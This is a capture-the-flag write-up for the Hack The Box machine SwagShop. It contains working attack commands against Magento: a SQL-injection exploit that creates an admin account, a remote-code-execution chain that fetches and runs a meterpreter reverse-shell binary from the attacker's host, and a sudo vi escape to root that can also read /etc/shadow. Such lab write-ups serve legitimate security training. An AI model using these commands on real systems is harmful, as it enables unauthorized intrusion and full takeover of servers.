# Target
| Category      | Details                                                  |
|---------------|----------------------------------------------------------|
| 📝 Name       | [SwagShop](https://app.hackthebox.com/machines/SwagShop) |
| 🏷 Type       | HTB Machine                                              |
| 🖥️ OS        | Linux                                                    |
| 🎯 Difficulty | Easy                                                     |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ nmap -sS -sC -sV $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 13:10 CEST
Nmap scan report for 10.129.229.138
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
```

`nmap` detected `swagshop.htb` virtual host. Let's add it to `/etc/hosts` and re-scan.
```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ echo "$TARGET swagshop.htb" | sudo tee -a /etc/hosts
10.129.229.138 swagshop.htb
```

```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ nmap -sS -sC -sV -p80 swagshop.htb                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 13:13 CEST
Nmap scan report for swagshop.htb (10.129.229.138)
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
```

# Foothold
We can see that `nmap` has found two remote services running on the target, with HTTP being quite obvious vector of attack. Brief browsing shows that Magento is running on web server. In the page footer we can see `© 2014 Magento Demo Store. All Rights Reserved.` With quick Google search we could find [history](https://www.mgt-commerce.com/blog/magento-versions-history/) of Magento releases, and it shows that Magento CE 1.9.x has been released in 2014. Additionally to that with `ffuf` we were able to find list of packages (under http://swagshop.htb/var/package/) which also shows 1.9.0.0.

With little bit of Googling we can find that this version is vulnerable to Post (admin) Authenticated RCE and [exploit](https://github.com/Hackhoven/Magento-RCE) is available. What we need now are admin credentials, and here with help comes [CVE-2015-1397](https://nvd.nist.gov/vuln/detail/CVE-2015-1397). We could use this SQL injection vulnerability to create admin account. There is [exploit](https://www.exploit-db.com/exploits/37977) that we could use, however as it is quite old, it needs a couple of fixes. Refreshed version could be found [here](CVE-2015-1397.py). We will use this chain to get `meterpreter` based reverse shell.

Let's start with running Metasploit `multi/handler` with `linux/x64/meterpreter/reverse_tcp` payload.
```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.106:4444
```

Next we will generate reverse shell binary and expose it over HTTP.
```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And finally we will execute exploit chain to download and execute our binary. 
```
┌──(magicrc㉿perun)-[~/attack/HTB SwagShop]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
python3 ./CVE-2015-1397.py && \
git clone https://github.com/Hackhoven/Magento-RCE.git && \
sed -i "s/^username = 'PUT_YOUR_CRED_HERE'.*/username = 'user'/" Magento-RCE/magento-rce-exploit.py && \
sed -i "s/^password = 'PUT_YOUR_CRED_HERE'.*/password = 'pass'/" Magento-RCE/magento-rce-exploit.py && \
python3 Magento-RCE/magento-rce-exploit.py http://swagshop.htb/index.php/admin "wget -P /tmp http://$LHOST:8000/shell;chmod +x /tmp/shell;/tmp/shell"
[✔] Injecting admin credentials...
[✔] [user:pass] injected
[✔] Use [http://swagshop.htb/index.php/admin] to login
Cloning into 'Magento-RCE'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 5.06 KiB | 5.06 MiB/s, done.
Form name: None
Control name: form_key
Control name: login[username]
Control name: dummy
Control name: login[password]
Control name: None
```

After a while we should get reverse connection back to `meterpreter`.
```
[*] Sending stage (3045380 bytes) to 10.129.229.138
[*] Meterpreter session 1 opened (10.10.14.106:4444 -> 10.129.229.138:58176) at 2025-04-20 10:30:15 +0200

meterpreter > getuid
Server username: www-data
```

We were able to gain foothold with `www-data` and additionally to that with its privileges we can access user flag. Let's grab it and proceed to escalation.
```
meterpreter > ls -la /home/haris/user.txt
100644/rw-r--r--  33  fil  2025-04-20 13:44:33 +0200  /home/haris/user.txt
```

# Privileges escalation
We will start escalation with dropping to shell and stabilizing it.
```
meterpreter > shell
Process 22638 created.
Channel 375 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@swagshop:/tmp$
```

Next step will be `sudo -l`, which actually yields very interesting result.
```
www-data@swagshop:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

With very powerful `(root) NOPASSWD: /usr/bin/vi /var/www/html/*` we can:
- Due to `*` at the end of the command we could traverse to any file and read it as root, e.g. `sudo /usr/bin/vi /var/www/html/../../../root/root.txt`. We could also read `/etc/shadow` or add root-shell spawn to `/etc/crontab`.
- Spawn root-shell from within `vi`
  - Open any file, e.g. `sudo /usr/bin/vi /var/www/html/api.php`
  - In `vi` set shell `:set shell=/bin/sh` and run with `:shell`